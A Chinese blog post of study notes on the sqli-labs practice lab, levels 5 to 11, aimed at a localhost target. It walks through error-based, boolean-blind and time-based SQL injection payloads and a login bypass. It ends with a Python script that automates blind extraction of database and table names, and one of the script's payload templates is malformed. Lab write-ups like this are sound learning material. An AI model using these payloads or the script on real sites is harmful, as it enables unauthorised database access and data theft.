---
title: sqli-libs学习笔记 Less 1-10
date: 2018-4-05 14:19:11
updated: 2018-8-17 00:06:00
categories: 
- 渗透测试
- 靶场笔记
- sqli-labs
tags: sql注入
---
2018年8月17更新：根据前辈写的，整合了8、9关的自动化脚本，计划有空实现其他关自动化注入整合到一个脚本中。

通过练习sqli-libs，对sql注入的理解有了全新的认识，话说之前都是神器sqlmap搞一下，惭愧~。说好的每天学习一关，对自己说声加油！！！
# sqli-libs less 5

## 0x00双查询知识
>http://www.2cto.com/article/201303/192718.html
## 0x01解题方法
首先单引号测试，发现和less1一样，报错，根据报错可判断为单引号字符型。
```
http://localhost/Less-5/?id=1'
#可能的sql语句：
select usernmae,password from user where id='$id'
```
联合查询，无输出信息，可能的情况是数据 执行了但未输出到页面。
```
http://localhost/Less-5/?id=1' union select 1,2,database() %23
```
利用双查询获取数据库信息。
``` sql
http://localhost/Less-5/?id=1' union select count(*) ,count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a %23
```


# sqli-libs less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)
---

## 0x00测试一波

``` bash
http://localhost:8004/Less-8/?id=1' //返回空
http://localhost:8004/Less-8/?id=1' and 1 = 1 %23 //非空
http://localhost:8004/Less-8/?id=1' and 1 = 2 %23  //返回空
http://localhost:8004/Less-8/?id=1000 //返回空

只显示空或者"You are in..........."，明显是屏蔽了报错信息，查询结果为空或者报错的时候显示空，这时就要使用盲注了。
猜测SQL语句为：SELECT * FROM users WHERE id='$id' LIMIT 0,1"
```
## 0x02基于布尔型的盲注知识


``` bash
length(str)：返回str字符串的长度。
substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
mid(str,pos,len):跟上面的一样，截取字符串
ascii(str)：返回字符串str的最左面字符的ASCII代码值。
ord(str):同上，返回ascii码
if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0
常见的ASCII十进制，A:65,Z:90 a:97,z:122,0:48,9:57
```
## 0x03开始猜测

``` bash
ascii(substr((select database()),1,1)) //返回数据库名称的第一个字母,转化为ascii码

简化点，不用if也是一样的效果
http://localhost/Less-8/?id=1' and ascii(substr((select database()),1,1))>114 %23 //返回正确，大于114，间在115-116之间
http://localhost/Less-8/?id=1' and ascii(substr((select database()),1,1))>115 %23
//返回错误(空)，不大于115，即第一个字母的ascii为115，即字母s
and前面为真，后面也为真，则判断ASCII正确。
if判断正确就显示You are in...........，判断错误就回空。
先判断一个小一点的>1,逐步增大〉10、20、30，直到出现空，往回逐步缩小范围。
根据以上同理猜测其他信息，手工当然很慢了，这时可以采用工具和脚本辅助。
```
# sqli-libs less 9 GET - Blind - Time Based - Single Quotes (基于时间的单引号GET盲注)
---
## 0x00测试
```
http://localhost/Less-8/?id=1'
http://localhost/Less-8/?id=1"
http://localhost/Less-8/?id=1' and 1=2 %23
无论怎么样结果都是一个：You are in...........
可猜测是时间盲注
```
## 0x01基于时间的盲注知识
```
sleep(N)：该函数可以通过延迟时间确定sql语句是否在后台被执行了，从获取到判断结果。
```
## 0x03开始猜测
```
http://localhost/Less-9/?id=1' and if(ascii(substr(database(),1,1))>115, 0,sleep(5)) %23 //错误 延迟了5s

http://localhost/Less-9/?id=1' and if(ascii(substr(database(),1,1))>114,0, sleep(5)) %23  //正确，无延迟
if判断正确就延迟5秒，判断错误就回0
先判断一个>1,逐步增大〉10、20、30，直到出现延迟5s，往回逐步缩小范围。
大于114 小于等于115，确定115是database()返回结果首字目的ascii，就这样一个一个字符猜测。
```
# sqli-libs less 10 GET - Blind - Time Based - Double Quotes (基于时间的双引号GET盲注)
```
http://localhost/Less-9/?id=1' and if(ascii(substr(database(),1,1))>115, sleep(5), 0) %23
```
# sqli-libs less 11 POST - Error Based - Single Quotes-string  (基于错误的POST型单引号字符型注入)
```
test' or 1=1 # //绕过，使用%23不行，入坑了。
```


# python 自动化脚本
参考giantbranch写的less8脚本，增加了less9支持，计划把其他关的全部实现。
```

# -*-coding:utf-8-*-
 
""" 
@version:  less8-less9
@author: giantbranch chuanwei 
@file: sqli-libs-chuanwei.py 
@time: 2018/8/16  
""" 
import requests
import urllib

class SqlInject(object):

    def __init__(self, lessNum):
        self.lessNum = lessNum
        self.successStr = "You are in"
        self.getTable = "users"
        
        self.index = "0"
        self.database = "database()"
        self.selectDB = "select database()" 
        self.selectTable = "select table_name from information_schema.tables where table_schema=\'%s\' limit %d,1"

        if self.lessNum == 8:
            #基于错误的盲注
            self.url = "http://localhost:8002/Less-8/?id=1"
            self.asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"
            self.lengthPayload = "' and length(%s)>=%d #"
            self.selectTableCountPayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"
            self.selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
            self.selectTableNameLengthPayloadbehind = ",1)>=%d #"
            self.selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='security'" + " and table_name='%s')>=%d #"
            self.dataCountPayload = "'and (select count(*) from %s)>=%d #"
        elif self.lessNum == 9:
            #基于时间的盲注
            self.url = "http://localhost:8002/Less-9/?id=1"
            self.asciiPayload = "' and if(ascii(substr(%s,%d,1))>=%d,0,sleep(2)) #"
            self.lengthPayload = "' and if(length(%s)>=%d,0,sleep(2)) #"
            self.selectTableCountPayload = "' and if((select count(table_name) from information_schema.tables where table_schema='%s')>=%d,0,sleep(2)) #"
            self.selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
            self.selectTableNameLengthPayloadbehind = ",1)>=%d,0,sleep(2)) #"

    # 发送请求，根据页面的响应猜测结果
    def get_result(self,payload,string,length=0,pos=0,ascii=0):
        if pos == 0:
            finalUrl = self.url + urllib.parse.quote(payload % (string, length))
        else:
            finalUrl = self.url + urllib.parse.quote(payload % (string, pos, ascii))
        res = requests.get(finalUrl)
        if self.lessNum == 8:
            if self.successStr in res.content.decode("utf-8"):
                return True
            else:
                return False

        elif self.lessNum == 9:
            if res.elapsed.total_seconds() < 2:
                return True
            else:
                return False

    # 获取字符串的长度          
    def get_length_of_string(self,payload, string):
        # 猜长度
        lengthLeft = 0
        lengthRigth = 0
        guess = 10
        # 确定长度上限，每次增加5
        while 1:
            # 如果长度大于guess
            if self.get_result(payload, string, guess) == True:
                # 猜测值增加5
                guess = guess + 5   
            else:
                lengthRigth = guess
                break
        # print "lengthRigth: " + str(lengthRigth)
        # 二分法查长度
        mid = int((lengthLeft + lengthRigth) / 2)
        while lengthLeft < lengthRigth - 1:
            # 如果长度大于等于mid 
            if self.get_result(payload, string, mid) == True:
                # 更新长度的左边界为mid
                lengthLeft = mid 
            else: 
            # 否则就是长度小于mid
                # 更新长度的右边界为mid
                lengthRigth = mid
            # 更新中值
            mid = int((lengthLeft + lengthRigth) / 2)        
            # print lengthLeft, lengthRigth
        # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid
        # 所以长度区间：大于等于 lengthLeft，小于lengthRigth
        # 而循环条件是 lengthLeft < lengthRigth - 1，退出循环，lengthLeft就是所求长度
        # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8<=length<9,length就肯定等于8
        return lengthLeft
    def get_name(self,payload,string,lengthOfString):
        tmp=""
        for i in range(1,lengthOfString+1):
            left=32
            right=127
            mid = int((left+right)/2)
            while left < right-1:
                if self.get_result(payload, string, pos=i, ascii=mid) == True:
                    left = mid
                else:
                    right = mid
                mid = int((left + right) / 2)
            tmp += chr(left)
        return tmp

    def get_table_name(self,selectTableCountPayload, selectTableNameLengthPayloadfront, selectTableNameLengthPayloadbehind, DBname):
        '''
        获取所有表名称
        :param DBname:
        :return:
        '''
        tableCount = self.get_length_of_string(selectTableCountPayload, DBname)
        tableName =[]
        for i in range(0, tableCount):
            # 第几个表
            num = str(i)
            # 获取当前这个表的长度
            selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
            tableNameLength = self.get_length_of_string(selectTableNameLengthPayload, DBname)
            # print "current table length:" + str(tableNameLength)
            # 获取当前这个表的名字
            selectTableName = self.selectTable % (DBname, i)
            tableName.append(self.get_name(self.asciiPayload, selectTableName, tableNameLength))
        return(tableCount,tableName)

    def get_column_name(self, selectColumnCountPayload, dataCountPayload, tableName):

        columnCount = self.get_length_of_string(selectColumnCountPayload, tableName)
        dataCount = self.get_length_of_string(dataCountPayload,tableName)

        return (columnCount, dataCount)




if __name__ == '__main__':
    
    #less9请修改为9
    lessNum = 8
    a = SqlInject(lessNum)
    print("Less: " + str(lessNum))

    DBlength = a.get_length_of_string(a.lengthPayload, a.database)
    print("数据库名长度：" + str(DBlength))

    DBname = a.get_name(a.asciiPayload, a.database, DBlength)
    print("数据库名称：" + DBname)

    #获取数据库表名称
    tableName= a.get_table_name(a.selectTableCountPayload, a.selectTableNameLengthPayloadfront, a.selectTableNameLengthPayloadbehind, DBname)

    print("表数量: " + str(tableName[0]))
    print("表名： " + str(tableName[1]))

    #获取users表数据
    dataCount = a.get_column_name(a.selectColumnCountPayload, a.dataCountPayload, a.getTable)
    print (dataCount)

```


---
本文为原创：转载请注明:https://wiki.viewcn.cn/